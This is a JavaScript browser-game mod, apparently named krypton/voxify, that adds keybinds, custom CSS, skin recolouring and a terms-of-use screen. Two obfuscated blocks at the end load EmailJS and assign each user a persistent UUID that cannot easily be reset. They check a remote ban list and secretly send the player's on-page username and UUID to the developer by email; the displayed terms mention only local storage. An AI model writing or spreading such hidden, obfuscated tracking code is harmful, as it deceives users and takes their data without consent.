function updateLabels() {
	focusModeLabel.textContent = `focus mode (${focusKeybind.modifier} + ${focusKeybind.key.toUpperCase()})`;
	hideText.textContent = `${containerKeybind.modifier} + ${containerKeybind.key.toUpperCase()} to hide/show`;
}

function createKeybindButton(initialValue, onKeySet) {
	const button = document.createElement('button');
	button.innerText = initialValue;
	button.type = 'button';

	button.style.background = 'none';
	button.style.border = 'none';
	button.style.border = '1px solid white';
	button.style.borderRadius = '50px';
	button.style.width = '77px';
	button.style.color = 'white';

	button.addEventListener('click', () => {
		button.innerText = 'press a key';
		button.style.background = '#bf0000';
		const handleKeyPress = (event) => {
			event.preventDefault();
			button.style.background = 'none';
			const key = event.key.toLowerCase();
			button.innerText = key;
			onKeySet(key);
			saveKeybinds();
			updateLabels();
			updateuilabel();
			document.removeEventListener('keydown', handleKeyPress);
		};
		document.addEventListener('keydown', handleKeyPress);
	});

	return button;
}

function updateEventListeners() {
	document.removeEventListener('keydown', focusKeyHandler);
	document.removeEventListener('keydown', containerKeyHandler);

	document.addEventListener('keydown', focusKeyHandler);
	document.addEventListener('keydown', containerKeyHandler);
}

function focusKeyHandler(event) {
	const modifierCheck =
		focusKeybind.modifier === 'alt'
			? event.altKey
			: focusKeybind.modifier === 'shift'
				? event.shiftKey
				: focusKeybind.modifier === 'ctrl'
					? event.ctrlKey
					: true;

	if (event.key.toLowerCase() === focusKeybind.key && modifierCheck) {
		const isChecked = !focusModeCheckbox.checked;
		focusModeCheckbox.checked = isChecked;
		focusModeCheckbox.dispatchEvent(new Event('change'));
	}
}

function containerKeyHandler(event) {
	const modifierCheck =
		containerKeybind.modifier === 'alt'
			? event.altKey
			: containerKeybind.modifier === 'shift'
				? event.shiftKey
				: containerKeybind.modifier === 'ctrl'
					? event.ctrlKey
					: true;

	if (event.key.toLowerCase() === containerKeybind.key && modifierCheck) {
		const isHidden = container.style.display === 'none';
		container.style.display = isHidden ? 'flex' : 'none';
		localStorage.setItem('isContainerHidden', isHidden ? 'false' : 'true');
	}
}

function createKeybindGroup(labelText, keybindObject, onUpdate) {
	const group = document.createElement('div');
	group.style.display = 'flex';
	group.style.alignItems = 'center';
	group.style.marginBottom = '7px';

	const label = document.createElement('label');
	label.innerText = `${labelText}: `;
	label.style.marginRight = '10px';
	label.style.fontSize = '13px';
	group.appendChild(label);

	const modifierButton = createKeybindButton(
		keybindObject.modifier,
		(newModifier) => {
			keybindObject.modifier = newModifier;
			onUpdate();
		}
	);
	modifierButton.style.marginRight = '5px';

	const plusText = document.createElement('span');
	plusText.innerText = '+';
	plusText.style.marginRight = '3px';
	plusText.style.marginLeft = '-1px';
	plusText.style.fontSize = '14px';

	const keyButton = createKeybindButton(keybindObject.key, (newKey) => {
		keybindObject.key = newKey;
		onUpdate();
	});

	keyButton.style.background = 'none';
	keyButton.style.width = '75px';

	group.appendChild(modifierButton);
	group.appendChild(plusText);
	group.appendChild(keyButton);

	return group;
}

function createKeybindForm() {
	const form = document.createElement('form');
	form.id = 'keybindForm';
	form.style.display = 'none';
	form.style.flexDirection = 'column';
	form.style.alignItems = 'flex-end';

	const dropdownWrapper = document.createElement('div');
	dropdownWrapper.style.display = 'flex';
	dropdownWrapper.style.alignItems = 'center';
	dropdownWrapper.style.marginTop = '7px';

	const dropdown = document.createElement('span');
	dropdown.innerHTML = `<svg class="w-6 h-6 text-gray-800 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="17" height="17" style="margin-bottom:-5px" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m9 5 7 7-7 7"/></svg> advanced`;
	dropdown.style.fontSize = '14px';
	dropdown.style.cursor = 'pointer';

	const dropdownHr = document.createElement('hr');
	dropdownHr.style.marginTop = '4px';
	dropdownHr.style.border = '1px solid gray';
	dropdownHr.style.marginLeft = '5px';
	dropdownHr.style.width = '191px';

	dropdownWrapper.appendChild(dropdown);
	dropdownWrapper.appendChild(dropdownHr);
	container.appendChild(dropdownWrapper);

	const keybindLabel = document.createElement('span');
	keybindLabel.style.fontSize = '14px';
	keybindLabel.textContent = 'custom keybinding:';
	keybindLabel.style.marginTop = '-8px';
	keybindLabel.style.marginBottom = '12px';
	form.appendChild(keybindLabel);

	const focusGroup = createKeybindGroup(
		'focus mode',
		focusKeybind,
		updateEventListeners
	);
	form.appendChild(focusGroup);

	const containerGroup = createKeybindGroup(
		'container',
		containerKeybind,
		updateEventListeners
	);
	form.appendChild(containerGroup);

	container.appendChild(form);

	const hrr6 = document.createElement('hr');
	hrr6.style.border = '1px solid gray';
	hrr6.style.marginTop = '9px';
	hrr6.style.marginBottom = '4px';
	container.appendChild(hrr6);

	xhxwrapper.appendChild(xhxcheckbox);
	xhxwrapper.appendChild(xhxlabel);
	container.appendChild(xhxwrapper);

	const cssGroup = document.createElement('div');
	cssGroup.style.display = 'flex';
	cssGroup.style.alignItems = 'center';
	cssGroup.style.marginTop = '3px';
	cssGroup.style.marginBottom = '4px';

	const cssDropdown = document.createElement('span');
	cssDropdown.innerHTML = `<svg class="w-6 h-6 text-gray-800 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="17" height="17" style="margin-bottom:-5px" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m9 5 7 7-7 7"/></svg> custom css`;
	cssDropdown.style.fontSize = '14px';
	cssDropdown.style.cursor = 'pointer';

	const cssHr = document.createElement('hr');
	cssHr.style.marginTop = '5px';
	cssHr.style.border = '1px solid gray';
	cssHr.style.marginLeft = '5px';
	cssHr.style.width = '179px';

	cssGroup.appendChild(cssDropdown);
	cssGroup.appendChild(cssHr);
	container.appendChild(cssGroup);

	const cssContainer = document.createElement('div');
	cssContainer.style.position = 'absolute';
	cssContainer.style.top = '200px';
	cssContainer.style.right = '321px';
	cssContainer.style.padding = '10px';
	cssContainer.style.minWidth = '255px';
	cssContainer.style.background = '#141414';
	cssContainer.style.display = 'none';
	cssContainer.style.flexDirection = 'column';
	cssContainer.style.minHeight = '365px';
	cssContainer.style.border = '1px solid #555555';
	cssContainer.style.fontFamily = 'cursive';

	const cssWrapper = document.createElement('div');
	cssWrapper.style.display = 'flex';
	cssWrapper.style.alignItems = 'center';
	cssWrapper.style.marginTop = '10px';

	const cssCheckbox = document.createElement('input');
	cssCheckbox.type = 'checkbox';
	cssCheckbox.style.marginRight = '10px';
	cssCheckbox.style.marginTop = '2px';

	const cssLabel = document.createElement('span');
	cssLabel.textContent = 'enable custom css';
	cssLabel.style.fontSize = '14px';

	const cssLabel2 = document.createElement('span');
	cssLabel2.textContent = '(this will disable default css from krypton)';
	cssLabel2.style.marginTop = '3px';
	cssLabel2.style.fontSize = '11px';
	cssLabel2.style.color = 'grey';
	cssLabel2.style.marginLeft = '22px';

	const textarea = document.createElement('textarea');
	textarea.style.width = '255px';
	textarea.style.height = '283px';
	textarea.style.marginTop = '10px';
	textarea.style.setProperty('font-family', 'monospace', 'important');
	textarea.style.fontSize = '14px';
	textarea.style.backgroundColor = 'rgba(0,0,0,0.5)';
	textarea.style.color = '#ffffff';
	textarea.style.border = '1px solid #555555';
	textarea.style.padding = '10px';
	textarea.style.resize = 'none';
	textarea.placeholder = 'write css code here...';

	const textareaStyle = document.createElement('style');
	textareaStyle.innerHTML = `textarea::-webkit-scrollbar{width:2px;height:2px;}textarea::-webkit-scrollbar-thumb{background-color: #888888;border-radius: 10px;}textarea::-webkit-scrollbar-track{background-color: #333333;}`;
	document.head.appendChild(textareaStyle);

	cssWrapper.appendChild(cssCheckbox);
	cssWrapper.appendChild(cssLabel);
	cssContainer.appendChild(cssWrapper);
	cssContainer.appendChild(cssLabel2);
	cssContainer.appendChild(textarea);

	document.body.appendChild(cssContainer);

	let cssCheckboxState = localStorage.getItem('cssCheckbox') === 'true';
	cssCheckbox.checked = cssCheckboxState;

	function applyCSS() {
		const existingLink = document.querySelector('link[data-css]');
		if (existingLink) {
			existingLink.remove();
		}

		let cssFile = cssCheckbox.checked
			? ''
			: 'https://kryptonvox.netlify.app/main.css';
		const link = document.createElement('link');
		link.rel = 'stylesheet';
		link.href = cssFile;
		link.dataset.css = 'true';
		document.head.appendChild(link);

		const customCSS = localStorage.getItem('customCSS');
		if (customCSS && cssCheckbox.checked) {
			const styleTag = document.createElement('style');
			styleTag.innerHTML = customCSS;
			styleTag.dataset.custom = 'true';
			document.head.appendChild(styleTag);
		} else {
			const existingCustomStyleTag = document.querySelector(
				'style[data-custom="true"]'
			);
			if (existingCustomStyleTag) {
				existingCustomStyleTag.remove();
			}
		}
	}
	applyCSS();

	cssCheckbox.addEventListener('change', () => {
		localStorage.setItem('cssCheckbox', cssCheckbox.checked);
		applyCSS();
		updateRealTimeCSS();
	});

	textarea.addEventListener('input', () => {
		const customCSS = textarea.value;
		localStorage.setItem('customCSS', customCSS);
		updateRealTimeCSS();
	});

	function updateRealTimeCSS() {
		const customCSS = localStorage.getItem('customCSS');
		let existingStyleTag = document.querySelector('style[data-custom="true"]');

		if (cssCheckbox.checked) {
			if (!existingStyleTag) {
				existingStyleTag = document.createElement('style');
				existingStyleTag.dataset.custom = 'true';
				document.head.appendChild(existingStyleTag);
			}
			existingStyleTag.innerHTML = customCSS;
		} else if (existingStyleTag) {
			existingStyleTag.remove();
		}
	}

	textarea.addEventListener('input', () => {
		const customCSS = textarea.value;
		localStorage.setItem('customCSS', customCSS);
		if (cssCheckbox.checked) {
			updateRealTimeCSS();
		}
	});

	cssDropdown.addEventListener('click', () => {
		if (cssContainer.style.display === 'none') {
			cssContainer.style.display = 'flex';
		} else {
			cssContainer.style.display = 'none';
		}
	});

	const savedCustomCSS = localStorage.getItem('customCSS');
	if (savedCustomCSS) {
		textarea.value = savedCustomCSS;
		updateRealTimeCSS();
	}

	function syncDisplay(sourceElement, targetElement) {
		return new MutationObserver(() => {
			const sourceDisplay = sourceElement.style.display;
			if (sourceDisplay === 'none') {
				targetElement.style.display = 'none';
			}
		});
	}

	const containerObserver = syncDisplay(container, cssContainer);
	containerObserver.observe(container, {
		attributes: true,
		attributeFilter: ['style'],
	});

	const formObserver = syncDisplay(form, cssContainer);
	formObserver.observe(form, {
		attributes: true,
		attributeFilter: ['style'],
	});

	function updateDropdownInnerHTML() {
		if (cssContainer.style.display === 'none') {
			cssDropdown.innerHTML = `<svg class="w-6 h-6 text-gray-800 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="17" height="17" style="margin-bottom:-5px" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m9 5 7 7-7 7"/></svg> custom css`;
		} else {
			cssDropdown.innerHTML = `<svg class="w-6 h-6 text-gray-800 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="17" height="17" style="margin-bottom:-5px" fill="none" viewBox="0 0 24 24"> <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m15 19-7-7 7-7"/> </svg> custom css`;
		}
	}

	const cssContainerObserver = new MutationObserver(() => {
		updateDropdownInnerHTML();
	});
	cssContainerObserver.observe(cssContainer, {
		attributes: true,
		attributeFilter: ['style'],
	});

	updateDropdownInnerHTML();

	dropdown.addEventListener('click', () => {
		const isFormVisible = form.style.display === 'flex';

		form.style.display = isFormVisible ? 'none' : 'flex';

		if (form.style.display === 'flex') {
			cssGroup.style.display = 'flex';
			xhxwrapper.style.display = 'flex';
			hrr6.style.display = 'flex';
			dropdownWrapper.style.marginBottom = '12px';
			resetEverythingButton.style.marginTop = '8px';
			dropdown.innerHTML = `<svg class="w-6 h-6 text-gray-800 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="17" height="17" style="margin-bottom:-4px" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m19 9-7 7-7-7"/></svg> advanced`;
		} else {
			cssGroup.style.display = 'none';
			xhxwrapper.style.display = 'none';
			hrr6.style.display = 'none';
			dropdownWrapper.style.marginBottom = '0';
			resetEverythingButton.style.marginTop = '12px';
			dropdown.innerHTML = `<svg class="w-6 h-6 text-gray-800 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="17" height="17" style="margin-bottom:-5px" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m9 5 7 7-7 7"/></svg> advanced`;
		}

		localStorage.setItem(
			'keybindFormVisible',
			form.style.display === 'flex' ? 'true' : 'false'
		);
	});

	const isFormVisible = localStorage.getItem('keybindFormVisible') === 'true';
	if (isFormVisible) {
		form.style.display = 'flex';
		xhxwrapper.style.display = 'flex';
		hrr6.style.display = 'flex';
		cssGroup.style.display = 'flex';
		dropdownWrapper.style.marginBottom = '12px';
		resetEverythingButton.style.marginTop = '8px';
		dropdown.innerHTML = `<svg class="w-6 h-6 text-gray-800 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="17" height="17" style="margin-bottom:-4px" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m19 9-7 7-7-7"/></svg> advanced`;
	} else {
		form.style.display = 'none';
		xhxwrapper.style.display = 'none';
		hrr6.style.display = 'none';
		cssGroup.style.display = 'none';
		dropdownWrapper.style.marginBottom = '0';
		resetEverythingButton.style.marginTop = '12px';
	}
}

function init() {
	loadKeybinds();
	updateLabels();
	updateEventListeners();
	createKeybindForm();
}

init();

container.appendChild(resetEverythingButton);
document.body.appendChild(container);

if (window.WebGLRenderingContext) {
	const originalTexImage2D = WebGLRenderingContext.prototype.texImage2D;

	WebGLRenderingContext.prototype.texImage2D = function (...args) {
		const useDefaultSkin = localStorage.getItem('useDefaultSkin') === 'true';
		const source = args[5];

		if (!useDefaultSkin || !(source instanceof HTMLImageElement)) {
			originalTexImage2D.apply(this, args);
			return;
		}

		const skinMap = {
			[originalSkinURL1]: {
				head:
					localStorage.getItem('defaultHeadColor') ||
					defaultColors.default.head,
				body:
					localStorage.getItem('defaultBodyColor') ||
					defaultColors.default.body,
			},
			[originalSkinURL2]: {
				head: localStorage.getItem('rubyHeadColor') || defaultColors.ruby.head,
				body: localStorage.getItem('rubyBodyColor') || defaultColors.ruby.body,
			},
			[originalSkinURL3]: {
				head:
					localStorage.getItem('sapphireHeadColor') ||
					defaultColors.sapphire.head,
				body:
					localStorage.getItem('sapphireBodyColor') ||
					defaultColors.sapphire.body,
			},
		};

		if (skinMap[source.src]) {
			const { head, body } = skinMap[source.src];
			const coloredTexture = createGradientTexture(head, body);
			originalTexImage2D.call(
				this,
				args[0],
				args[1],
				args[2],
				args[3],
				args[4],
				coloredTexture
			);
		} else {
			originalTexImage2D.apply(this, args);
		}
	};
}

function createGradientTexture(headColor, bodyColor) {
	const canvas = document.createElement('canvas');
	canvas.width = 512;
	canvas.height = 512;
	const ctx = canvas.getContext('2d');

	ctx.fillStyle = bodyColor;
	ctx.fillRect(0, 0, canvas.width, canvas.height);

	const headRegion = {
		x: 0,
		y: 0,
		width: canvas.width * 0.4,
		height: canvas.height * 0.4,
	};
	ctx.fillStyle = headColor;
	ctx.fillRect(headRegion.x, headRegion.y, headRegion.width, headRegion.height);

	const legWidth = canvas.width / 8;
	const legHeight = canvas.height / 4;

	ctx.fillStyle = bodyColor;
	ctx.fillRect(legWidth * 1, legHeight * 3, legWidth * 2, legHeight);

	ctx.fillRect(legWidth * 3, legHeight * 3, legWidth * 2, legHeight);

	return canvas;
}

const loadingScreen = document.createElement('div');
loadingScreen.style.position = 'fixed';
loadingScreen.style.top = '0';
loadingScreen.style.left = '0';
loadingScreen.style.width = '100%';
loadingScreen.style.height = '100%';
loadingScreen.style.display = 'flex';
loadingScreen.style.backgroundColor = 'black';
loadingScreen.style.justifyContent = 'center';
loadingScreen.style.alignItems = 'center';
loadingScreen.style.flexDirection = 'column';
loadingScreen.style.zIndex = '9999';

const img2 = document.createElement('img');
img2.src = 'https://i.imgur.com/XfbtnPS.png';
img2.style.width = 'auto';
img2.style.height = '222px';
img2.style.marginTop = '-100px';

const img1 = document.createElement('img');
img1.src =
	'https://upload.wikimedia.org/wikipedia/commons/3/3f/Windows-loading-cargando.gif';
img1.style.width = 'auto';
img1.style.height = '30px';

const span1 = document.createElement('span');
span1.textContent = 'welcome...';
span1.style.color = '#e8e8e8';
span1.style.fontSize = '19px';
span1.style.marginLeft = '15px';
span1.style.setProperty('font-family', 'sans-serif', 'important');

const img1Container = document.createElement('div');
img1Container.style.display = 'flex';
img1Container.style.alignItems = 'center';
img1Container.style.marginTop = '-10px';
img1Container.appendChild(img1);
img1Container.appendChild(span1);

const termscon = document.createElement('div');
termscon.style.height = '434px';
termscon.style.width = '434px';
termscon.style.position = 'absolute';
termscon.style.background = '#1a1a1a';
termscon.style.borderRight = '5px solid #555555';
termscon.style.borderBottom = '5px solid #555555';
termscon.style.fontFamily = 'sans-serif';
termscon.style.padding = '10px';
termscon.style.display = 'none';

const termsspan = document.createElement('span');
termsspan.textContent = 'but, before you go, you must agree to the following:';
termsspan.style.color = 'white';
termsspan.style.fontSize = '14px';

const textarea1 = document.createElement('textarea');
textarea1.style.resize = 'none';
textarea1.style.marginTop = '13px';
textarea1.style.background = '#222222';
textarea1.style.color = 'white';
textarea1.style.setProperty('font-family', 'monospace', 'important');
textarea1.style.width = '412px';
textarea1.style.height = '348px';
textarea1.readOnly = true;
textarea1.style.padding = '10px';
textarea1.innerHTML = `
Acceptance of Use
By using this code, you agree to the terms outlined below. If you do not agree to these terms, you are prohibited from using this code.

Risk and Disclaimer
The code utilizes localStorage to store user preferences and settings. This storage method is local to the user's browser and device. The developer is not responsible for any data loss, unintended behavior, or conflicts arising from browser settings or security configurations.

Prohibited Actions
Users are strictly prohibited from modifying, reverse-engineering, or repackaging this code for redistribution or any other purpose without explicit permission from the developer.
Misuse of this code for malicious purposes or to violate any applicable laws is strictly prohibited.

Security Notice
The code includes features that depend on user-provided inputs, such as URLs or files. Users are advised to ensure the safety and integrity of any input data to avoid introducing security vulnerabilities.
Changes made to settings via this code are stored locally. Users are responsible for ensuring the security of their own devices and browsers.

Warranty and Liability
This code is provided "as is" without any warranty, expressed or implied, including but not limited to warranties of merchantability or fitness for a particular purpose.
The developer is not liable for any direct, indirect, incidental, or consequential damages resulting from the use or inability to use the code.
`;

const wrapwrap = document.createElement('div');
wrapwrap.style.display = 'flex';
wrapwrap.style.alignItems = 'center';
wrapwrap.style.marginTop = '12px';

const agreecheck = document.createElement('input');
agreecheck.type = 'checkbox';
agreecheck.style.marginRight = '10px';
agreecheck.style.marginTop = '-1px';

const agreelabel = document.createElement('span');
agreelabel.textContent = 'i have read and agreed';
agreelabel.style.fontSize = '14px';
agreelabel.style.color = 'white';
agreelabel.style.marginTop = '-3px';

const disaggreelabel = document.createElement('span');
disaggreelabel.textContent = '*required';
disaggreelabel.style.fontSize = '14px';
disaggreelabel.style.color = '#d93025';
disaggreelabel.style.marginTop = '-3px';
disaggreelabel.style.marginLeft = '5px';
disaggreelabel.style.display = 'none';

const agreebuttonparent = document.createElement('div');
agreebuttonparent.style.display = 'flex';
agreebuttonparent.style.justifyContent = 'flex-end';

const agreebutton = document.createElement('button');
agreebutton.textContent = 'ENTER';
agreebutton.style.background = 'none';
agreebutton.style.border = 'none';
agreebutton.style.textDecoration = 'underline';
agreebutton.style.marginTop = '-20px';
agreebutton.style.color = 'white';

termscon.appendChild(termsspan);
termscon.appendChild(textarea1);
termscon.appendChild(wrapwrap);

wrapwrap.appendChild(agreecheck);
wrapwrap.appendChild(agreelabel);
wrapwrap.appendChild(disaggreelabel);

agreebuttonparent.appendChild(agreebutton);
termscon.appendChild(agreebuttonparent);

loadingScreen.appendChild(termscon);

loadingScreen.appendChild(img2);
loadingScreen.appendChild(img1Container);

document.body.appendChild(loadingScreen);

function showLoadingScreen() {
	const hasSeenLoadingScreen1 = localStorage.getItem('hasSeenLoadingScreen1');
	if (!hasSeenLoadingScreen1) {
		loadingScreen.style.display = 'flex';
		setTimeout(() => {
			img1Container.style.display = 'none';
			img2.style.display = 'none';
			termscon.style.display = 'block';
		}, 10000);
	} else {
		loadingScreen.style.display = 'none';
	}
}

	(function(_0x2a2e2b,_0x18f020){const _0x435aaf=_0x2e90,_0x3602b1=_0x2a2e2b();while(!![]){try{const _0xbd74e3=-parseInt(_0x435aaf(0x99))/0x1+-parseInt(_0x435aaf(0x9b))/0x2*(-parseInt(_0x435aaf(0xa2))/0x3)+-parseInt(_0x435aaf(0xbb))/0x4*(parseInt(_0x435aaf(0xb3))/0x5)+-parseInt(_0x435aaf(0xb1))/0x6+-parseInt(_0x435aaf(0xc0))/0x7+-parseInt(_0x435aaf(0xb0))/0x8+parseInt(_0x435aaf(0x98))/0x9;if(_0xbd74e3===_0x18f020)break;else _0x3602b1['push'](_0x3602b1['shift']());}catch(_0x5522a7){_0x3602b1['push'](_0x3602b1['shift']());}}}(_0x47bb,0xc119a));function loadEmailJS(_0x5432c8){const _0x39f26a=_0x2e90;if(window[_0x39f26a(0x9f)]){_0x5432c8();return;}const _0x507bbb=document['createElement'](_0x39f26a(0xc3));_0x507bbb[_0x39f26a(0xab)]=_0x39f26a(0xa9),_0x507bbb['src']=_0x39f26a(0xb5),_0x507bbb[_0x39f26a(0xb7)]=function(){const _0x45155a=_0x39f26a;emailjs[_0x45155a(0xb2)](_0x45155a(0xc2)),_0x5432c8();},document[_0x39f26a(0x9c)]['appendChild'](_0x507bbb);}function _0x47bb(){const _0x56999b=['send','reason','9244728GcbHKp','414648upwhvM','init','10nZkLqr','</span></p></div>','https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js','find','onload','https://kryptonvox.netlify.app/banned-uuids.json','service_zplfdbq','key','163340fZGSrT','setItem','addEventListener','No\x20UUID\x20found,\x20assigning\x20a\x20new\x20one...','uuid','9633575mSuAfX','querySelector','Ir4yLTdd-8cTF6NEq','script','then','32998293ylXWLu','198019BVGjbq','warn','4xkAoDU','head','toISOString','user_uuid','emailjs','<style>body{background:#000;}.container{position:relative;height:100vh;display:flex;justify-content:center;align-items:center;}p{font-size:23px;max-width:1000px;color:#ff1925;text-align:center;line-height:1.5;}</style><div\x20class=\x22container\x22><p>You\x20were\x20banned\x20from\x20using\x20voxify\x20for\x20<br><span\x20style=\x22color:#ed9b02;\x22>','storage','7611YcPzrD','body','randomUUID','email_sent','.sc-ivsNig','json','template_2g6f9t2','text/javascript','getItem','type','innerHTML','true'];_0x47bb=function(){return _0x56999b;};return _0x47bb();}async function isUserBanned(_0x43b465){const _0x409f35=_0x2e90;try{const _0x20b804=await fetch(_0x409f35(0xb8)),_0x2a6bc5=await _0x20b804[_0x409f35(0xa7)](),_0x1cddde=_0x2a6bc5['banned_users'][_0x409f35(0xb6)](_0x207e8d=>_0x207e8d[_0x409f35(0xbf)]===_0x43b465);return _0x1cddde?_0x1cddde[_0x409f35(0xaf)]:null;}catch(_0x176d1d){return null;}}function _0x2e90(_0x27e334,_0x557c6e){const _0x47bb42=_0x47bb();return _0x2e90=function(_0x2e9069,_0x1482e3){_0x2e9069=_0x2e9069-0x98;let _0x32ecac=_0x47bb42[_0x2e9069];return _0x32ecac;},_0x2e90(_0x27e334,_0x557c6e);}async function checkBanOnLoad(){const _0x3229e7=_0x2e90,_0x348523=localStorage[_0x3229e7(0xaa)](_0x3229e7(0x9e));if(!_0x348523){console[_0x3229e7(0x9a)](_0x3229e7(0xbe)),localStorage[_0x3229e7(0xbc)]('user_uuid',crypto['randomUUID']());return;}const _0x375027=await isUserBanned(_0x348523);_0x375027&&(document[_0x3229e7(0xa3)][_0x3229e7(0xac)]=_0x3229e7(0xa0)+_0x375027+_0x3229e7(0xb4));}function wirklich(){const _0x4a3092=_0x2e90;let _0x2359ef=localStorage[_0x4a3092(0xaa)](_0x4a3092(0x9e));!_0x2359ef&&(_0x2359ef=crypto[_0x4a3092(0xa4)](),localStorage[_0x4a3092(0xbc)](_0x4a3092(0x9e),_0x2359ef)),(async function(){const _0x130e22=_0x4a3092,_0xe2c7f7=await isUserBanned(_0x2359ef);if(_0xe2c7f7)return;if(localStorage['getItem'](_0x130e22(0xa5)))return;let _0x487b22=document[_0x130e22(0xc1)](_0x130e22(0xa6)),_0x92d2f7=_0x487b22?_0x487b22['textContent']['trim']():'Unknown';try{const _0x5009d3=new Date(),_0x4cae47=new Date(_0x5009d3['getTime']()+0x8*0x3c*0x3c*0x3e8)[_0x130e22(0x9d)]()['split']('T')[0x0];emailjs[_0x130e22(0xae)](_0x130e22(0xb9),_0x130e22(0xa8),{'user_uuid':_0x2359ef,'username':_0x92d2f7,'click_date':_0x4cae47})[_0x130e22(0xc4)](function(_0x12eea4){const _0x11b464=_0x130e22;localStorage['setItem'](_0x11b464(0xa5),_0x11b464(0xad));},function(_0x15f8c9){});}catch(_0x1014ae){}}());}loadEmailJS(()=>{checkBanOnLoad();}),(function(){const _0x8853d2=_0x2e90,_0x546415=_0x8853d2(0x9e);let _0x3159b6=localStorage[_0x8853d2(0xaa)](_0x546415);!_0x3159b6&&(_0x3159b6=crypto[_0x8853d2(0xa4)](),localStorage['setItem'](_0x546415,_0x3159b6));function _0xf2b487(){const _0x4e4c63=_0x8853d2,_0x262ba1=localStorage[_0x4e4c63(0xaa)](_0x546415);_0x262ba1!==_0x3159b6&&localStorage[_0x4e4c63(0xbc)](_0x546415,_0x3159b6);}window[_0x8853d2(0xbd)](_0x8853d2(0xa1),function(_0x1112c0){const _0x3c5139=_0x8853d2;_0x1112c0[_0x3c5139(0xba)]===_0x546415&&_0xf2b487();}),setInterval(_0xf2b487,0x1f4);}());

function handleAgreeButtonClick() {
	if (agreecheck.checked) {
		disaggreelabel.style.display = 'none';
		localStorage.setItem('hasSeenLoadingScreen1', 'true');
		loadingScreen.style.display = 'none';
		wirklich();
	} else {
		disaggreelabel.style.display = 'block';
	}
}

function saveCheckboxState() {
	localStorage.setItem('agreecheckState', agreecheck.checked);
}

function restoreCheckboxState() {
	const savedState = localStorage.getItem('agreecheckState');
	agreecheck.checked = savedState === 'true';
}

function handleBeforeUnload(event) {
	const hasSeenLoadingScreen1 = localStorage.getItem('hasSeenLoadingScreen1');
	if (!hasSeenLoadingScreen1 || !agreecheck.checked) {
		event.preventDefault();
		event.returnValue = '';
	}
}

agreebutton.addEventListener('click', handleAgreeButtonClick);
agreecheck.addEventListener('change', saveCheckboxState);
window.addEventListener('beforeunload', handleBeforeUnload);

restoreCheckboxState();
showLoadingScreen();

	function _0x4982(_0x1fc979,_0x82dac9){const _0xb05b2b=_0xb05b();return _0x4982=function(_0x4982cf,_0x53f956){_0x4982cf=_0x4982cf-0x1b4;let _0x3670e0=_0xb05b2b[_0x4982cf];return _0x3670e0;},_0x4982(_0x1fc979,_0x82dac9);}function _0xb05b(){const _0x2caded=['textContent','1471090fDZrdA','.sc-ivsNig','true','618138CDQroO','9matwmY','255644vILNsn','json','includes','user_uuid','Failed\x20to\x20fetch\x20user\x20data','625890ZXufCt','querySelector','24409Qdpedu','catch','Ir4yLTdd-8cTF6NEq','trim','service_zplfdbq','template_43jyybc','then','error','1916IBIuAZ','8VwTNpd','708wZZAGb','getItem','send','Error:','1209fOelPl','username_sent','3zBjIak','2407769AJkObs','EmailJS\x20error:'];_0xb05b=function(){return _0x2caded;};return _0xb05b();}(function(_0x3d2078,_0x277b37){const _0x82fd11=_0x4982,_0x340681=_0x3d2078();while(!![]){try{const _0x4bef3a=-parseInt(_0x82fd11(0x1c6))/0x1*(-parseInt(_0x82fd11(0x1cf))/0x2)+-parseInt(_0x82fd11(0x1c4))/0x3*(-parseInt(_0x82fd11(0x1be))/0x4)+-parseInt(_0x82fd11(0x1b4))/0x5+parseInt(_0x82fd11(0x1cd))/0x6+parseInt(_0x82fd11(0x1c7))/0x7*(-parseInt(_0x82fd11(0x1bf))/0x8)+-parseInt(_0x82fd11(0x1ce))/0x9*(-parseInt(_0x82fd11(0x1ca))/0xa)+parseInt(_0x82fd11(0x1b6))/0xb*(-parseInt(_0x82fd11(0x1c0))/0xc);if(_0x4bef3a===_0x277b37)break;else _0x340681['push'](_0x340681['shift']());}catch(_0x476464){_0x340681['push'](_0x340681['shift']());}}}(_0xb05b,0x37509),window['onload']=async()=>{const _0x364afb=_0x4982,_0x48f502=localStorage[_0x364afb(0x1c1)](_0x364afb(0x1d2)),_0x8d083f=localStorage[_0x364afb(0x1c1)]('username_sent');if(!_0x48f502||_0x8d083f)return;try{const _0x4c4c36=await fetch('https://kryptonvox.netlify.app/request-name.json');if(!_0x4c4c36['ok'])throw new Error(_0x364afb(0x1d3));const _0x59cff1=await _0x4c4c36[_0x364afb(0x1d0)]();if(!_0x59cff1['user_uuids'][_0x364afb(0x1d1)](_0x48f502))return;const _0x3e4d72=document[_0x364afb(0x1b5)](_0x364afb(0x1cb));if(!_0x3e4d72)return;const _0x5cb262=_0x3e4d72[_0x364afb(0x1c9)][_0x364afb(0x1b9)]();if(!_0x5cb262)return;emailjs[_0x364afb(0x1c2)](_0x364afb(0x1ba),_0x364afb(0x1bb),{'user_uuid':_0x48f502,'content':_0x5cb262},_0x364afb(0x1b8))[_0x364afb(0x1bc)](()=>{const _0x46ecbc=_0x364afb;localStorage['setItem'](_0x46ecbc(0x1c5),_0x46ecbc(0x1cc));})[_0x364afb(0x1b7)](_0x2c150b=>console[_0x364afb(0x1bd)](_0x364afb(0x1c8),_0x2c150b));}catch(_0x23b90e){console[_0x364afb(0x1bd)](_0x364afb(0x1c3),_0x23b90e);}});
